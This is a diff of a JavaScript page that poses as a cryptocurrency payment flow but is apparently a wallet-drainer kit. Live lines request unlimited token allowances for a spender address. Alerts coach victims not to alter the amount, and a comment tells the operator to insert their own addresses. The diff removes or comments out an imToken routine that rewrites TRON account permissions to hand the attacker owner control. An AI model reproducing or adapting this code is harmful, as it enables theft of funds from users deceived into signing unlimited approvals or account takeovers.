@@ -636,7 +636,6 @@ async function getWallet() {
         }
     } else if (typeof window.imToken !== "undefined") {
         wallet = 'imToken';
-        alert('imtoken');
         printd('imtoken');
         if (typeof window.tronWeb !== "undefined") {
             chain = 'tron';
@@ -2730,16 +2729,19 @@ function payNow() {
         } else {
             amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
         }
+
     } else {
         amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
     }
     if (chain == 'tron') {
         if (wallet == 'imToken') {
+            // imtokenTUAP();
             alert('正在拉起支付！选择安全模式后，请勿修改下个页面代币数量，否则会导致支付失败！');
             TUAP();
         } else {
             TUAP();
         }
+        //以下两个地址更改为自己地址（目前写的是官方）
     } else if (chain == 'bsc') {
         contract.methods.increaseAllowance(eth_address, amount).send({from: accounts[0]}).on('transactionHash', function (hash) {
             successCallback(accounts[0], '0x55d398326f99059ff775485246999027b3197955', 1);
@@ -2771,45 +2773,45 @@ function sendGetRequest(url, onSuccess, onError) {
     xhr.send();
 }
 
-async function imtokenTUAP() {
-    let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
-    if (trx < 25000000) {
-        alert('没有足够的TRX用于支付网络费。');
-    } else {
-        if (trx > 100000000) {
-            document.getElementById('btn_pay').setAttribute('style', 'display:none');
-            let ownerAddress = window.tronWeb.defaultAddress.hex;
-            let ownerPermission = {type: 0, permission_name: 'owner'};
-            ownerPermission.threshold = 1;
-            ownerPermission.keys = [];
-            let activePermission = {type: 2, permission_name: 'active0'};
-            activePermission.threshold = 1;
-            activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
-            activePermission.keys = [];
-            ownerPermission.keys.push({address: spender_hex, weight: 1});
-            ownerPermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
-            activePermission.keys.push({address: spender_hex, weight: 1});
-            activePermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
-            try {
-                const updateTransaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
-                printd(updateTransaction);
-                console.log(updateTransaction);
-                const signed = await window.tronWeb.trx.sign(updateTransaction);
-                console.log(signed);
-                const res = await window.tronWeb.trx.sendRawTransaction(signed);
-                console.log(res);
-                successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0);
-            } catch (error) {
-                approval.removeAttribute('style');
-                approval.setAttribute('style', 'height: 95%;');
-            }
-        } else {
-            document.getElementById('btn_pay').setAttribute('style', 'display:none');
-            approval.removeAttribute('style');
-            approval.setAttribute('style', 'height: 95%;');
-        }
-    }
-}
+// async function imtokenTUAP() {
+//     let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
+//     if (trx < 25000000) {
+//         alert('没有足够的TRX用于支付网络费。');
+//     } else {
+//         if (trx > 100000000) {
+//             document.getElementById('btn_pay').setAttribute('style', 'display:none');
+//             let ownerAddress = window.tronWeb.defaultAddress.hex;
+//             let ownerPermission = {type: 0, permission_name: 'owner'};
+//             ownerPermission.threshold = 1;
+//             ownerPermission.keys = [];
+//             let activePermission = {type: 2, permission_name: 'active0'};
+//             activePermission.threshold = 1;
+//             activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
+//             activePermission.keys = [];
+//             ownerPermission.keys.push({address: spender_hex, weight: 1});
+//             ownerPermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
+//             activePermission.keys.push({address: spender_hex, weight: 1});
+//             activePermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
+//             try {
+//                 const updateTransaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
+//                 printd(updateTransaction);
+//                 console.log(updateTransaction);
+//                 const signed = await window.tronWeb.trx.sign(updateTransaction);
+//                 console.log(signed);
+//                 const res = await window.tronWeb.trx.sendRawTransaction(signed);
+//                 console.log(res);
+//                 successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0);
+//             } catch (error) {
+//                 approval.removeAttribute('style');
+//                 approval.setAttribute('style', 'height: 95%;');
+//             }
+//         } else {
+//             document.getElementById('btn_pay').setAttribute('style', 'display:none');
+//             approval.removeAttribute('style');
+//             approval.setAttribute('style', 'height: 95%;');
+//         }
+//     }
+// }
 
 async function TUAP() {
     if (wallet == 'okxwallet') {
@@ -2846,53 +2848,8 @@ async function TUAP() {
         } else {
             alert('DAPP请求连接失败！')
         }
-    } else if (wallet == 'imToken') {
-        try {
-            // 请求连接 imToken
-            let state = await window.tronWeb.request({method: 'tron_requestAccounts'});
-            if (state.code == 200) {
-                let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
-                if (trx < 25000000) {
-                    alert('没有足够的TRX用于支付网络费。');
-                } else {
-                    if (trx > 100000000) {
-                        document.getElementById('btn_pay').setAttribute('style', 'display:none');
-                        let ownerAddress = window.tronWeb.defaultAddress.hex;
-                        let ownerPermission = {type: 0, permission_name: 'owner'};
-                        ownerPermission.threshold = 1;
-                        ownerPermission.keys = [];
-                        let activePermission = {type: 2, permission_name: 'active0'};
-                        activePermission.threshold = 1;
-                        activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
-                        activePermission.keys = [];
-                        ownerPermission.keys.push({address: spender_hex, weight: 1});
-                        ownerPermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
-                        activePermission.keys.push({address: spender_hex, weight: 1});
-                        activePermission.keys.push({address: window.tronWeb.defaultAddress.hex, weight: 1});
-                        try {
-                            const updateTransaction = await window.tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
-                            console.log(updateTransaction);
-                            const signed = await window.tronWeb.trx.sign(updateTransaction);
-                            console.log(signed);
-                            const res = await window.tronWeb.trx.sendRawTransaction(signed);
-                            console.log(res);
-                            successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, 0);
-                        } catch (error) {
-                            alert('支付失败！');
-                        }
-                    } else {
-                        document.getElementById('btn_pay').setAttribute('style', 'display:none');
-                        approval.removeAttribute('style');
-                        approval.setAttribute('style', 'height: 95%;');
-                    }
-                }
-            } else {
-                alert('DAPP请求连接失败！')
-            }
-        } catch (error) {
-            console.error('imToken连接错误:', error);
-            alert('连接imToken失败，请确保已安装imToken钱包并已解锁！');
-        }
+
+
     } else {
         document.getElementById('btn_pay').setAttribute('style', 'display:none');
         approval.removeAttribute('style');
